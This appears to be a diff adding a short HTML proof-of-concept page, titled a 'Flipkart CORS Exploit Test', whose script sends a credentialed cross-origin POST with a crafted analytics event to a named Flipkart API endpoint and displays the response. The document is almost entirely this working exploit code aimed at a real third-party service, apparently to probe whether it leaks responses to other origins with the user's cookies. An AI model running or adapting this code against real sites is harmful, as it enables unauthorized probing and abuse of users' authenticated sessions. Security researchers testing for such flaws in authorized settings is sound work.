@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Flipkart CORS Exploit Test</title>
+  </head>
+  <body>
+    <h2>Testing Flipkart CORS Misconfiguration</h2>
+    <pre id="output">Loading...</pre>
+
+    <script>
+      fetch("https://1.sonic.fdp.api.flipkart.com/4/data/collector/business", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify([
+          {
+            nc: {
+              ssid: "test",
+              meta: {
+                sMode: "BLUE",
+                loc: {
+                  ipInfo: {
+                    country: "test",
+                    state: "test",
+                    city: "test",
+                    ip: "127.0.0.1"
+                  }
+                }
+              },
+              pn: "homepage",
+              pt: "hp",
+              iid: "test",
+              mpid: "FLIPKART",
+              fm: "organic",
+              ppt: "hp",
+              ppn: "homepage"
+            },
+            e: [
+              {
+                ev: [{ name: "TEST", value: 100 }],
+                nm: "cors-check",
+                en: "AE",
+                mt: {
+                  platform: "desktop",
+                  pageUri: "https://www.flipkart.com/",
+                  userAgent: navigator.userAgent,
+                  language: navigator.language
+                },
+                t: Date.now()
+              }
+            ]
+          }
+        ])
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").innerText = "Response:\n" + data;
+      })
+      .catch(err => {
+        document.getElementById("output").innerText = "Error:\n" + err;
+      });
+    </script>
+  </body>
+</html>
